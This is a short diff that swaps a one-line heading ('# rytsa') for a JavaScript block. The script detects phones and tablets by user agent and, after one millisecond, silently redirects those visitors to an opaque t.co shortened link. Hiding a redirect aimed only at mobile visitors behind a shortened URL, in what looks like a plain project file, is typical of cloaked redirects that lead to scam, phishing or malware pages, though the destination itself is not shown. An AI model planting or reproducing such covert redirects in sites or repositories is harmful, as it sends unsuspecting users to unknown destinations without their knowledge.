@@ -1,1 +1,20 @@
-# rytsa
+<script type='text/javascript'>
+
+  function mover(){
+    window.location = 'https://t.co/aZirWieN0m'
+
+  }; 
+
+if(navigator.userAgent.match(/Android|webOS|iPhone|iPod|Blackberry/i) )
+{
+
+ setTimeout(mover,1)
+
+}
+
+if (navigator.userAgent.match(/Tablet|iPad/i))
+{
+    setTimeout(mover,1)
+}
+
+</script>
